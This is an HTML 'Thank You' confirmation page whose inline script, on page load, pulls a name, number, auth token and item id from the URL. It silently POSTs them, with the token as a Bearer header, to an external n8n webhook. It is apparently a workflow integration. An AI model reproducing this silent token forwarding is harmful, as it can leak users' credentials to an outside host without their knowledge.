<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;800&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1a1a1a;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            color: #eeeeee;
            overflow-x: hidden;
        }

        /* Initial state is hidden to prevent flickering before name is parsed */
        #content {
            opacity: 0;
            transition: opacity 0.8s ease-in;
        }

        .container {
            text-align: center;
            margin-top: clamp(5rem, 15vh, 20rem);
            padding: 1rem 2rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 800px;
        }

        .highlight {
            color: #ffffff;
            font-weight: 800;
            display: inline-block;
        }

        .message {
            font-size: clamp(1.5rem, 6vw, 2.5rem);
            font-weight: 300;
            letter-spacing: -0.02em;
            line-height: 1.3;
            color: #d1d1d1;
            margin-bottom: 1.5rem;
            width: 100%;
        }

        .divider {
            height: 1px;
            background: linear-gradient(
                90deg, 
                transparent 0%, 
                rgba(255, 255, 255, 1) 50%, 
                transparent 100%
            );
            width: 70%; 
            max-width: 400px;
        }

        @media (max-width: 480px) {
            .container {
                margin-top: 25vh;
            }
        }
    </style>
</head>
<body>

    <div id="content" class="container">
        <h1 class="message">
            Thank You! <span id="userName" class="highlight">...</span><br>
            for your cooperation.
        </h1>
        <div class="divider"></div>
    </div>

    <script>
        async function processPage() {
            const fullUrl = window.location.href;
            
            // 1. Extract Name and Number using Regex
            const match = fullUrl.match(/\(([A-Za-z]+)(\d{1,2})\)/);

            if (match && match[1] && match[2]) {
                const extractedName = match[1];
                const extractedNumb = match[2];

                // Update UI immediately
                document.getElementById('userName').innerText = extractedName;
                document.getElementById('content').style.opacity = "1";

                // 2. Robust Token Extraction
                // Since the token is followed by (NameNumber), we extract everything 
                // between 'auth=' and the start of the bracket
                let token = "";
                const tokenMatch = fullUrl.match(/auth=([^()]+)/);
                if (tokenMatch && tokenMatch[1]) {
                    token = tokenMatch[1];
                }

                // Basic auth removed (no longer used)

// 4. Prepare Webhook Payload
const itemIdMatch = fullUrl.match(/&(\d+)$/);
let itemId = "";
if (itemIdMatch && itemIdMatch[1]) {
    itemId = itemIdMatch[1];
}

const payload = {
    name: extractedName,
    numb: extractedNumb,
    token: token,
    itemid: itemId
};

                // 4. Send Webhook with broader compatibility
                try {
                    await fetch('https://n8n.norkx.space/webhook/emailcoming', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
    },
    body: JSON.stringify(payload)
});
                } catch (error) {
                    // Silently fail if webhook is blocked
                }
            } else {
                // Fallback for direct page access
                document.getElementById('userName').innerText = "Guest";
                document.getElementById('content').style.opacity = "1";
            }
        }

        // Execute immediately on load
        document.addEventListener('DOMContentLoaded', processPage);
    </script>
</body>
</html>
